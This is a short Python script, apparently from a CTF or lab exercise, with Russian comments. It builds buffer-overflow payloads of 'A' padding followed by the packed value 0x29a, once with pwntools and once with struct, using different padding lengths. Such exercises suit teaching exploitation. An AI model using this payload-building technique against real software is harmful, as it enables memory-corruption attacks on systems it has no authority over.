from pwn import *

# Способ 1: Используя pwntools
payload = b"A" * 8 + p32(0x29a)
print(payload.decode('latin-1'))

# Способ 2: Вручную с struct
import struct
payload = b"A" * 36 + struct.pack("<I", 0x29a)
print(payload.decode('latin-1'))
print("Payload bytes:", payload.hex())